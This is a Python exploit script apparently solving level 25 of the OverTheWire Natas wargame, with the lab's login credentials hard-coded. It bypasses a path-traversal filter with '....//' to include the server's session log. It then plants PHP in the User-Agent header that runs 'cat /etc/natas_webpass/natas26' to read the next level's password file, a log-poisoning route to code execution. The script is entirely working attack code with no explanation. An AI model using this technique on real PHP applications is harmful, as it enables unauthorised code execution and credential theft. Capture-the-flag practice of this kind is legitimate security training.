
import requests

auth = ('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c')
s = requests.Session()
s.auth = auth

data = {'lang': 'en'}

req = s.post(
    "http://natas25.natas.labs.overthewire.org/index.php",  data=data)
session_ID = req.cookies.get_dict()

data = {
    'lang': f'....//logs/natas25_{session_ID["PHPSESSID"]}.log'}
headers = {
    'User-Agent': '<?php system("cat /etc/natas_webpass/natas26"); ?>'}

req = s.post('http://natas25.natas.labs.overthewire.org/index.php',
             headers=headers, data=data)

print(req.text)
